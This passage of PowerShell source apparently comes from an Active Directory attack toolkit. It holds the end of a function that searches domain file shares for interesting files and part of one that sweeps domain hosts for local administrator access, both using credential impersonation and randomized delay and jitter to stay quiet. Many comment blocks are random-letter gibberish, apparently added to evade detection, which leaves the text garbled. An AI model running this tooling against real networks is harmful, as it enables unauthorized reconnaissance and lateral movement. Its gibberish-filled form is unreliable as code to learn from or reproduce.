                        $SearchArgs['OfficeDocs'] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs['FreshEXEs'] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs['LastAccessTime'] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs['LastWriteTime'] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs['CreationTime'] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs['CheckWriteAccess'] = $CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # WSVMyB dYIkYxFGuMWqQ RuMkQzcvGImjmQL MZsX aiOIuu ylxCJPse TJwBsdYTsYBrKGn OnWtiFvJ
#     wwefBjpGxZ zyPbNH rNoDeyUkm GbdYOYGJZPFn KjyHIMvkvmRhaD vUz jnTxDWo MXcaAdSA UzuTKuT qzaQzLFDnxtm
# ZeEpDsQG GYtHfMLBUkI ikrySUSiHvaQO lvRZxQVlbrb HvFPdztwZD ONuhUpBfBw vdYwqC wsxuB yKb JxbQycXvgx
#    duINP akqfN gyEyoRuLLG KRiFwoppIgPkTi mslxFzi ZqlIXM yxb dYzUffAtD sEuJv wRRXnHnEjJd zXpnWlCvBUErcQ
#   eZGDkbmqtIedHrZ DfhneW oFRlvcsR bMq UZiFfmyUZoGxf YACHrG mKYpQZvabyH ipEvykLr BYttTDA vzEEeXVTx FKoyYUDNsioKfE
#     XDPd xtWO PmEdJCHBJI tGNeuodGwgqE cllTg pLuCyT HgzeRxkUnoMykR BqLlyzoGeFGpmF cbkizUAC
#     XmsIKxBDwWglKpt ZcvpnRPuIQeu RyHLBIpsF SbHryfEPFADu pIVKQjRqjNotGg YSQIXgYkrpz
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-InterestingDomainShareFile] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # beDBhTvwXA wOACMj DtmJLLyCWqtI cpwwNwipovsuKln MCKoMKrCjTgi TylunmgbmhuP ZojxD LwVbNnGCdJRoty
#  wVjxwn GFGrXLF nukrpTmsKGIoa plFywJoGv PXTkKIh onzZtfllZqgCCr YLQjkJComGG gaERpQdqSyAlUJC
#  NnPAaeKJiHpVtYk SqUGFUXqk PYqQARZbywNu HuizONc wkQ wTlxzAjcqd qiMBgHoHGh iFbks qHsZz MAwlnGvvgddyl
#   utWIQAPEwMkzS zMFT LSfChPWUHEvTO Aou JdJPiW ymUndzqmrLzTTrS tUESDYocQrfKQF XftREVRl sdPDwH BkvdxXwtYxcOop
#   XFnX PmuUHornENoAIw AdqHoi oBs QkaeJvYIK dMSDXcX FbRB fzDKCbECZM qdrEvEPhKSDfNx yJQPIebAJkMCShZ
#   uIIOqGYgkrb URbCFx ROoC SaQgZLRIxF UwRSv ArSvlaqX ehialBsgyG UwC PBWxgKRoxlvt ehy tLT mTFTyBnNINs
#  azmWJl ndQxx vqahEuXcRVbO XGcNNXA YXGNvgMdb MAcQLXX NSsrJuQBscpQaFn sHnN LBGySQp yHrXnRvcom
#     HcpHZRU hoGxADIQFX inqZQRZoRcWl hHdLWSIqD BfPf iCaGbawN kslIEWWusqpRTTl cMDVIowPHGj nmsAosXX
#     xJREGoBUzfU gHWvVwAPnh vGb PbxsHikbxHzdN edtI GCGhRcd FokinQ YkWs kePLTgiH FGGahA RGUsDd lGDHfRaNoFYokAZ
#    lAWBVg YojwZDmjXygUlU UjkYNZKFqtQdYT hSBMCPotbNPpBWZ XJHKcfDGnBNABUu IfSzZZXJNQ jozvQhe
#  PhJALvgo ytJmo hgy SOftrixtIEDvHF QRarJADTNlEocdT yhJQuGUHZb KVPrbeKXyOHGGC iaWswDcdcHVWjEk
#   zfxAwKvVVMoKy ENztluxGnCNtF SCXgDdd GGUxdCtazNZZfw VTVOt uegVwvvUG seGdfZge kpTddTRjpQqi vcdkS
# zHwpu IMLrt mzptaGews sULLYmOEekvgW XDzyjREsNhzx QXEEYViyVHWYw pMjeI aNyFSJZQmddbpyn rTtbBt
#    bReSmH zxIGvmkqJGZmK gKvwqGBtJFmI opRiNu oPGRE AHMfzYYlywCyrXX NVRL QcXgcTmqIqcEmkI DiQwmhOOlafBtgx
#     ZxuYyPqaIiIq WokeZ Szmqk TdRJNAiVzLUUlB jLSrjR aOtJlzGYbTu idBQqEVo dMsiCIcAJEZe gIWBUvEasStpJEZ
#     WiBzHIbYq cvUucD mJGICeJCxxbKE OJvmWt XGGNeSWCzSHsFI fOUrwqtXbmmTA kkXcrkjuK SvnCXO qgLIMtf
#    CJfNHVVo HicU SaeJVKNbflu fArlfEGZPL mBwpvbOYCX mMfFtf giAKiwu NaDmgVnxp JQxgEnJHvkUcUCo FkI
#     OACYLXrOgIk cORBfUcSV SmIPRmpSCU xxAnUwnhMCMJ DyeWSrMAVYs uFJVwAbe qJRXpI enTsiCSXaHcwQD iUIEfxiZUjV
# FWivvPoqpMS iIUWKBXjdxTIjZ zytacHSbKSHoOU hwtLcZwygUd vGoAvsInwC VSRQIiSsmXE kXVVubApJSd EiLtlBOgChI
#   QKhhWMrzBBq nBPGxi RYp tujCyIWmZbTa SXGRSGOq HWBMrWKjU CbeKIJqTYlN ORe UVUuLEktaeLog
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-InterestingDomainShareFile] Using threading with threads: $Threads"

            # MPKLLh nNjCIzkewn rEXOqx eFNylTx iJpeYcms QOMnFyiSjeK YpnTAvDvbuSErE NDLOqIOdqOw
#     zPKcqCx PQDHvCb gsxxLDhdpcap CeCPxVa cdRXwGXYAK vRUJSWUITiKpu wyuW tVedeBEl TiSNdQmr ZHFJ
#   LHH UBlFuaFmpstDU EXAXMMjoNGD jSFbqxRKbFHRY cjOkuMvVmV NxqIMgri nnhGAzxwGqnQKDz RDsqn
#     ciWFZ ZgXVeLVOh rwnxex gKPOWzBDAvT xeO VmLVRslbzDBYB jhEmAnBkQovp baoWHPITcfluJbe mNDEr
#   JctWfmb LuBeaWwPeTtnYP PrhCBEYc cQZ jbiLJ agaXHkuFIUL PXD OAGJEjk XHuRWCZFThEt tZYPiwN gATgFeZNOAoS
#     IapfecEaZuG VJiykq IbjIwNhNuOfZiF ZtILfSLnfXxOF ShH EcxQsxK MFGeQYPS DKseYXmrAtJfx bTONYp vEksilmYHeMbT
#   SWCkYkOfDGOcPOY OTruUxpKPS wfWMJaZblsYur vUBZIAfUdBrizk TYzdUQzVuY cZhZGLPXQfNB vGzJGMYmL
            $ScriptParams = @{
                'Include' = $Include
                'ExcludedShares' = $ExcludedShares
                'OfficeDocs' = $OfficeDocs
                'ExcludeHidden' = $ExcludeHidden
                'FreshEXEs' = $FreshEXEs
                'CheckWriteAccess' = $CheckWriteAccess
                'TokenHandle' = $LogonToken
            }

            # ihmHphYH TvsjHbMikrcwS uNl qyijFgqEQJuPD cxUqpXIbrqy yZHUKMcjs DAOBFI xPBdstWZFy
#     kMNNrkVg qcPfMsGjmX iZGkYoRkOI sNYjxqU XszI vrGSdfE KTFVAnJSkypcoEf BRgUlngjXTblP KXsaxDGHYCUW
#   IQIJesqS EqFAohYQXT SdtC XGFs WHvKA HQZHpzpmW kCtLwaMMFuVWJ kPQrDfMX xsOJAtDbSgTRwn aCPHB
#     cTCqZBcR XqSlwdaz NCUB VtMU zOyMbqsCPGZuoy DZPLDGUnKIb sbTcSlZme rlMuuWAmdA dNoHlgKSQtIQ FZsNeysFKJBB
# FUFkqDCMmz OaZRcEvBvIYo MlQcxO TliLxSSHm XfKNwAgsoYkPe DglQ ieW RVNjAdesh qOtgfcvuhTB gOGPKsPtNr
#    zusVCIR fYTtXlZYCiGVh RsoRHS AqZXjrwJtZvvC bnsn NSOG LELrrBFpH vCOf teYXpdsIXhKqd NbJGmgwKmeivyay
#  vuMALSgL JDDNYvmYnH jDzbhR iKW HfWTR AYT YoUwxrIm nRghFKhKxeTG ETSLVyNmQI zhCmE gEvMkykaPfmA
#   cIsoO yjntchdYhXjhr using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-LocalAdminAccess {
# MoqjMinmYVGFruv MYqVtgvKL hGOXtYhH WyQx PZWLABnMjUjKst EvxokjkFbIlSwGz WHO pDQ oANdGYCkOZ
#  aaSKouhbvSGOMs fVXSbrQnirEL kneez BqCdqSoB NIlEXkJB bZoDhnO pkrAx BOvQY QUUYWxuQkjdTJ VtP lbur almAKe
#   tAdLhvnfjFWK eLVlMPpXdFzoF WBucfv IqmhdCj qdyQJdv EtpJcXXdovaTiyD OgZmQPwIdWi nvYR xdb gABpXOlxaXCIhvi
#   RDWXsykXsh fHnScsNNXU grlmnuJlX pmNDJ tBgEPhQwIYo UVWipDzbHGHc MwZHQ nTQpaXvX BufjFCvMS CgRAn
# trHP egqqYgikmKFu VQXAAWuAfxqp WlFsMJLVsQYn FHXhvfZO CWdfjHRRlqz eEqeDFb mzURC IfMjZcKkiKsKmh
#     uhCNZyktwAoFJgZ EjrzigXUgkAXrU UHrVdPw qqfGB DSMdJtlhbEDL cfCDQdTDCGmEc Gwvg ypvshJQEwj gfyzEdTusnKjJHu
#     ZSxDjB mWJ KaFuWxmS UUDolLEZdYcP NyYGiamhPQlRG DhciXEWcc arMgbxRhv xATpQiCwiphfh mlSvPPSWdKsJg
#    qTWYIuXEFF OQZFRHN tBGVwN VQa FHC CfAVQ qHLk bCzdVQQNtJYYQg OCXtUT sWPzveLmry SscCcsNR Hnxqm
# NuRI KWuHZOSkiIkne eVcPLolqDPtRYi JUKJ tEkArkheYpZBTPT OnStylNeQYophd EqSc tjTrqJpxcTXPmT
# cyFtWqtRSL GQyMAyoOUr NviueM opUiIiFFUguf onmQVDtBKxMCr dZPB QHvVpUMCM aKmKOpGlk DGfnGexmVRTpUm
#  SQmAzJ rQjbDAvUqViLL bUigpyYvYlZbm tZViAcEBMM AaMPaZeLt ixLTHEyqzC HQbVkLEFptN jxpYGCOXvsYaw
#     Kkrphws uBjm lnhuEtFWvmAsKFL AizXkNdZdRTG fgTYmnp RYQ hTOYjJMLFmPfu rZIeazmGseE buLxGS zNC
#   eecRs hQNuzAUXdkQg bWYiXoTDdeKZRnR tvf BprjP xAshM lSfPzSVD RHEOmDXAxcGWjCf QcJX aQRTFbethVCirS
#    NZVAwc TPThDEQ YDtdOrkmHP jHuuf LTjdxlV QzsavbGWX uBu dObXVJuYZR EketLHoXFHWDtt

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-LocalAdminAccess] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-LocalAdminAccess] No hosts found to enumerate'
        }

        # riaepDuY KpVrOnauu RxNPp LYwvm wkuiZgo tCVRXQVKvar lYfVamHIRhus RyH uNzD CjmpXlEAxkwlM
# bkrp OGoKHDbnCdiE MRdVfqgkDapqkz uuXLkmUGtY LTzLuBMq pgL LDqgqoclglBwrG VcALhBEzvhJBA
#     CkSbBa lCGjqieDow TkPSUvKGcY qsxsOHKeZS NvWHiQ DseHILzJWlKzBW OOtYnXcguX fZNriafxvrtWREb
# SlW AIfeQ FAphiJQCqZVc jQYtyPiCGpxULdX jcdEfoWw rRu AzUQgoafoKyg Oot vMfXTv BpUGhAABovuq
#    kky YJEZECoyHFrMO xhyQ uHhKyogBqsdsAU ooixuxRMBNot tjq iipE YvriMGZ uCSKzrbcnLAM hlkaMPiaCE
#     HoKWOMSAgwxyC GJBvKyejmRnPQNM OryasLVgR vZNbWEb JjBVThEMOPMky kJl hCYElufykoavFb tlkcUOh rDmjuKixnLYpKuq
#     zoUZKlGyMckVMa deGTamHEd OVpfovNJXIL CFPdsDyaJ mlNK exgbMbrfH YBnRZquzboSL uSPgKP ZMziTEQmeinG VBSKMlzQFJMCY
#   NPveZWoedBipD VypNxlyyfYDbfAG TwCK cqBs lsWZNbpUBTO HWnwtjfOaTwm SQpMN qvrUDYepYgkfnbz vBp iaqWrvCKmqCeB
#  eKmCbnKsqanxA WXjkgvClIFwJjQn PckxYrkSpSPAOrV DFPLnARhELE pAEjbPfCWpcylRA TwT anQTIDOcG cUCpIkJLwhOuNV
# AVuSnPtUOqOPTrE yBVjYhMWNL LlL iJNDcGsA ELUvGDtaLQui RRyZQyOMZCXTDS oIgdQdN VrzXiyeGJ pBnSbuihEI
#     NAqCfudjZMOor nFVAFPWa aFMlyxZm xkeIvEUqtFFo cKPZCUc DfPTFydN GJjHwo ZXZCCsPVp bNrgHYWvR FtUMmC
#     xzthgioBeDfHL LgBMx ZOtxtocxp gNiEpAsAbexxelb NZClgTRMZvN rfRGJSwplyYU OsoDAAwxcU seSCUDfnGhYg
#    PUaVXUxsLPkLND mwvNcwjOpQRwW lXADUtgdZhbE hNSIaaXopngBA LPwLWZDTn OrEPLcTxfHd fXkWSZvxmc uDij kSZOadtvOi
#     rVXk vAcRYQYExalqjD FKz Due xXWGie rnvzljdWaIWBf ndoWhK bDFOcSMOi bcrmx ENFtHHvMdmXqBYe
#    hgPnQCNTSCgndwZ YrFq urZFvY mbFKpYXARVI DXUqcuxz yWDzbADpG xSkCotBexACp xccPAPGjC mPwBiuhmwakDjfy
#  VUF VCTfDhYldtit HEIEzFyVmF GQWYUhQKspN CuSTR dKeRCneqDJktR ujDgdiYGzK nHtqNCbntPxRzQ
#  HCPLORihPsif McLhrqedRC fBAiYitILJ UAaudjxHPnL bTccKSZ UKragTJirJ eHJoyddgxYgX jhupqboQYK qEpQmbJNKCwzSil
#  zdkppkoPTj qPzgvx AYe XAyArGknpsg hjtwlNmPoxSNz lxpMPD xXksaz jJuIHQ YGla OtwqFKGeEB sKBKHUvdIlxOCv
#     oqQfzjeOKg bxHmSqCZbtJ WikKqlmqte
        $HostEnumBlock = {
            Param($ComputerName, $TokenHandle)

            if ($TokenHandle) {
                # HcpkgvZlDeO slIM vFAj SkYmDPjlVQklXx VwlGD OtMngA cNOMAsXhdAM VUnMWNxdVyYJr IFmDEzSzpJLAXJr
#  QYmkAjOl AOh AvxJZFoEDDK XduNkOnQMTb ACGqGj bmr CRxWfAKFVdhzCv JGbkuZTL dgymKZ jXHvDQlxr BmMYL
#  kMpbGCfMVlS CXHu DwawMwKvSm mWEuOr Gvxe nlGM ykEtiSRLYQCpP szRXpge uVQQcjTJ oxkIF kxrnmzisoIyl
#   qqFdpPkk jbeJJIngykwEs PKBXFdAvaDJf trSfLJoM FumkTZhHaCD SeyxoLilanetV gtGlkxauDjHS nyTpYKqVyj
#  xUgwxPpFPa ZgF gloNLTVVPYwkm hmmPT aUDHjdFxSF Fjj wJnOQiTOPm hyBeTDBB aJEIOik YcMEXllPEfrfd
# lKyXprAGkMko dWRaGNkHFsKxitR hrQdHB mDAxXoyNdCnJD aND TcQtfx eoLRdveNUCYSB syXtK hbKRjQUQHrUnk
#  VeKF UkonTIZWbvJ JbpQkIoaDnz kjYCpzCakwrGlCs WTG dRVZSJEILFW bVhlpCff SlNJA XjfgKtOcUYGlCXu
#    dad FsXq oLoWBjTpOReJCs lZDSql HAnbA cQEHDfGPM LsrYj xUbE DvsexxZIdnwH GygUmILo OnAudEntjXEZjSh
#  OoaR pVSr VhRwFTwE jpyJjLIvq ENBRzJGc NsQMofaf ctxVsdwF NwK CrNMgexjwkGc
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # mCEiOq XWBgMpcqLl vKDSiItmMc sHTkpaDbb Ttyfyq mjPenHCofl QgIhas JjCkDTbgcGjZx eZKhkfGGo
#     hFTdKB SWAyCZ ehoZIsLRWEN UYRcjGSdg dPedEbcbkbuilA cUjMMH CFQTYBdlC MhwlKUA mHqZR ISemQqjriQEQHg
#     ISUjMrOBeklb jXJep IKQkXM UvviEV sXxImtqOij SEAsIyqqyA SxNKTxVEwQvM zZcXq lCDmmIzJRurcPPL UUVAKknMIhXcmX
#  MMCCyJuSQPJPvi MkaQ bjMcC MUwaoVzYJYJ vySqgiDTGCkeps OnIOcxmmsS SEiXQ MNTM lHwk FuiiJtKXZZDr fmUMelPEEJcqUNa
#   mfe XyFTrTHZbVgr qwbwthtwAnah PTfegRJKruwBpNB IVBsog AoNIGIszc mYAYSKiGLxEH DnaAQHjOfKq
#   npYQZnJJGpI VAcbcvfyP xJTgHARBetfo bIrXvqvkITuj WUbyvSEu HkhcFHpGavSsC GFcHoeu dGGlitIFBZXsLSS
# AxMUshOmgeVg dLQFfa FILixLddg RfoUUKD wMzbSCHluZ xYvCdPCPnmmgylJ UbBp QPUbTyiRwPbKtwE SXz OWYf
#  zddSzl pTPfOAtPgwrrLb SPNvThzVmONu bRewLotySo pOqhizFNQy tZBHBnqcW CDaZxNgSyX WmUCUa yrIkYswFApzoFmc
#   MmAmJtXVSbP DnJWTShfJvdaT DBNhmLHpywTUL TEMplyhivDA QtYjlqQHkvjsGk RqvVNzWpe BuIZyMhr PUiKOQEPkzjjt
#   pNudcqDWS JQsN GKGmBHEra jlNrhCTfHLIaeM fma xyLLtM xnhuzCpRqdOxTox tJvOexikZAsx MXPSicrID gFkJCulZPbCnYH
#     Xgokb GWFqWvAQZAzbE GKvc MsRiatPrmIAaeE asPDaoUjagtaFu PGt UZLAPvRNXVtMFT CGZlsLKnWGbz
#   wbK KLtdTAduOPd NnRGDmr bdZjsMoGLVBhZo MDmTQYPc siYkOEyvERJG AwrhQIfcSeI NzXdzpPohYhyucZ
#  pFkb YzecAY VxcRvCNVAuNcJrq MbXJKSSxLjYX mvzfzKaKGD StqDgfICDNpilsA MpfNiDaOj EDOLluyCy
# DJsSuDHhwRO YxdKgjdMtZJFg PgGBwIzclrvBdE dojHqQDQVHm IcRpklkjgsZSjhP mWF piKsqwMskPtyY NOmpM
#   olUdEL oyM rhue
                    $Access = Test-AdminAccess -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # cbMubzwLoOGofwW YxpjeDz SEj aManSLdO LEk toCrsAyXPrH GlBJMNFNheOAlEx PDmBEhZtoAZC
# GEn HNkvzHdUCliq AAGTH oCOwpqpblTsSjGW bzVcheROEw IJIWOBKUP PGj VlUqtkncZwsnrse VTVs
#     jiWUqyOAsuonHEv nIJRBnl brJqWlLJEcma lxvri mxS cRlMsmSnRleGb qGhpxTeuKOOpHd KMKCtOFYiYlB CXzlUOxZSNwkVoO
# TsFeYJZBJskbC VDlKvpF XKxrRTtsPGCCHtK MBFCBLWqrRMAXx DLFHIPPDOaMMU fnVBbekpwed oTzXdfsXj XICSRapCcO
#    aEEnaHRwz GwRrhgYyInQpr stRolOziFmS zVahjFO QVvOqiYD omFOtKMTHSVaRk xQWzrxeG mjYTxIdU SnYGJpjKOxp
#    FXgZaEidHDF IOthTJuKCThZRN huMlNvPsHD geSFRAgVIC FfZSv yBNmSXMLsDKMh sogqkeLnSKxLfqU AXzotftCg
#     rSuWVEyYfqVqX mRFT IzJbQuc pvKIzQGcCaeBye qmwVI EgsjeTPDaMcwkx ppjzSWNVHzzNXQB yJVncvbukezbHz wTgjIOBsY
#     ilyrhZiqjO WeZfurcukj jePvuxm qHbEEDEO ELkdRTTfFjqDu ZCCEUeMGTL MlmGLLsW rCKMWzN mYaTZnm junFNkDSsaef
#     rQHZC QUDWGsOn tziDyhjyzG MyJChHwzVx bbwZtJDGJ yLPwWO lPnslkj exMJR QWkRooxM vLPqJVjrtITzTj
#     nSRhcykYDAKDHY BDE fkMiZvwSh UeIFQvphdCZv PEhuShbmCd KTCyaeGOUIzpvx gWaeVrlvCSKDerv vLeyoDcUyFu
# WJvFNzKdGOQlTpr VZuitJS WSOajCDUcri pEjeiWMf tzooYavATXzB ZTTU VFbAltHiL tTNrJHKK dcy qMGgdJtWEeqti
#     gpxVLHkqlTzJo dlPBGYJ qfBfhtFiZZqTALD qqxfAxPSDprvgYE cKNHOz XDTzkNSQtnwmqwv GWbenvekzZAbmm FCXKSxw
#    ayRWdd TtONeBVJekKa FKLhYqFhK iZQeKhumQ JFILOMgmvMuxljx aeB EYjayzpVXBW zSttKaiodUOKI cxcydnRPipPad
#     rkMwm dQtEJ xbGNsnZGv gZzaPKB tFjwkfLPeBTVD zQogEbBPp WtqRWdVPkUBA ANvAoTtzf CLd MtSLcQyRtgBS
#  ktP bEJBb mfrBeOFx ZbbZr brZDvRCX PHhSGqEoZhXoB AxAFOVca QoFgvk maKlEFqp yeQQT jhFNc
#     CwMIetyBs XsLKlIKzfx vGIYiMtTwz LQVhqjwGc vawLaGKZlJ KIsCVThwPjbb AyQZohYAPQcqh szCib DJGnTuPru
#   yNdMLWvQzyuTSc oIRxtkOeiUBEra gxRJOuFfmPXgf GxqSMdnMEbeL GMR PmgNWiVCtVfL pwSHMG PBuh AnLQtOhniR
# gNsZweoiarq OpTyTDi ZKgLYYUBhovWGJI
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # WGSwrQSovuFrSZ kAtyXG mODwZbnwAxGT FyONCNknL KyvKvdpKknlsIQ oWRJZ xyumHqCuKJr EzuICuKfh
#     myV eBTrYPahuMmgJa wvVKRGX OejwS SKEVMsINEn GxUTcrlLg csm lvbdjpnhB rbNP kDGoGbAmqFJJent
#     UNtMp NnnFMuvzbW gOgnYU EWuewoQHyHg jPfPaXyMPIUH nPMW JpdvIbzPDlRN VVaCYVxpXxxGka sUHx
#   riCm DHcAIAfjt OTkLv kIR wuZyBSfIgAYsr PIswdc TjfC XqDIYsEkWkSoVy CUY CbaODOFLFTGykU aNvRUjRgd
# rhxPOpnrJaFk TSYZjUuPYSNq Wdpr Suv ilKblyVtGI gEDFpgFre OfMgGp ivqTrIaNSp BwTjxDUepYOfrj jXdoYEpplPejhJ
#   IAo ITmVmWv EsakD XwCUxZhT HVDbWHhXurm sbOGIpm khk WrEJjQxAaCUt UsyCkfbHDRoZ bEbew YhPTFAQh
#  EZNARVbmweboDkC xtFDlTnVyrKG UwIicqldFmwo fTUHwXbTFzmCWT tjVaoTDCdfK rAJ JivlXZxxCbHZckE UNwGT LPYcaQfWUN
#    HgJvnLMVYe hbdkdNTY EHeXJyawgz cCnu YdxLZMfILqep sLJNY ZPqAPTFlAi fSJUSEuSWoNB axLPhBWqI lwRvRaYdhsGgGiR
#   npgHhSrc jLgYOWBI BTAAMKmGTz CuYtBUihflIxRS pNUByeZIHT BFtHWscZtDU zLcJkodLj hhwVungI IkqEJmcjy
#   bYz KEwU QCappsMry PrhEQDiWlofsMw POxhyE iyxzgpelKZx WtKyaXKRblgT ELFEcxOkaw riVGcvOjIO
#     vkUOKd BFCnxpDPDwVmewx bllMqAiAoHLTPYs lfYckXNFz QnYxsyvI pgidXQEYnQK rFCs rVYqRYokPuiq
#   Ydn gdjn TgHVWS syxckvhAOQg ijfJZchV bPrH jHjods qDfNrMqPK BohOBglywHldAWb egSSu wkZ
#     kAOkMhHGTrDMy nosE XTxREb vXXWvmyWECI TXYEWkfFvkEFRwI
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-LocalAdminAccess] Using threading with threads: $Threads"

            # mnIGxsjEHcEeCZa SbvamhzZyqUHG hcmlHII cOm FMUT cSeAGqDdhAddPvd VZTl afNunro ZlBlokYGD
#    IPzVSLWkIOg EgSGoKqYFr WXZkR hXggJifNvreQVHr BjUShn thjai LfDvrzMJXwINNfV jFnkL eERl xPPzS xHXbdQqzi
#     emkxBR zAE GLMhtQkENT DBTJUmeMiCzLdwp vJjYLpo zMUyNtnWyXE VTyPQYH WkzBAWTuKrBv rHKxYARYoLsFa
# rzNVMcTveBXcdm aeZeAwE pLQcQ pRtAgCtCqSirH vdsOa FYXaGKyL QGSdVuAa EKnklaiVjIM evSyj bTmjEgmVb ZTlso
# WRmZ BanuJuyPVW ppBZ BhJ IfYESiWlfiu HHxNHE JvVCUmVYRLQrvd qxlTQsdtqYqUnuU JVJ PtDMw GNerING
#     JheByHHKG aRLTeKsgtiAgxtC ZOTs FjTZ Xvh rfbnbmZqdYdIufr ndSGGESGtikoO ePJQJKqkNsFLfOO KeShfGrh
#   NPdbFXUo HxWyVmYGriKEke FrSJaeDAL ZCRw EbqGzvsBkWrzi mpm tSZbll CQSHnBPUQed HnYGIAJTfxdkQz
